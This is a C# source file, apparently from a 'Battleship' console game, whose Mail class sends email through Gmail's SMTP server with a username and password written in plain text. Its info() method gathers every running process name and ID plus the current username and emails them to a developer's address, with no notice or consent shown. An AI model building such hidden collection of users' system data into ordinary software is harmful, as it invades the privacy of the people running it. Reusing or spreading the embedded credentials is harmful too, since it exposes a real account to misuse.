using System;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Mail;
//using System.Net.*;
namespace ConsoleApp1
{
    class Mail
    {

        private void sendMessage(string subject, string body)
        {
            MailMessage mail = new MailMessage("porfanid@googlemail.com", "pavlos@orfanidis.xyz");
            SmtpClient client = new SmtpClient();
            client.Port = 25;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("porfanid", "kjidghheeocsjdcv");
            mail.Subject = subject;
            mail.Body = body;
            client.Send(mail);
        }






        public void contact(string subject,string body)
        {
            sendMessage("Battleship: " + subject, body);
        }

        public void info()
        {
            String body = "";
            Process[] processlist = Process.GetProcesses();
            foreach (Process theprocess in processlist)
            {
                body+=("Process: "+ theprocess.ProcessName + " ID: "+ theprocess.Id)+"\n";
            }

            String subject=null;
            
            subject = "Computer Info for "+Environment.UserName;
            sendMessage(subject, body);
        }
    }
}
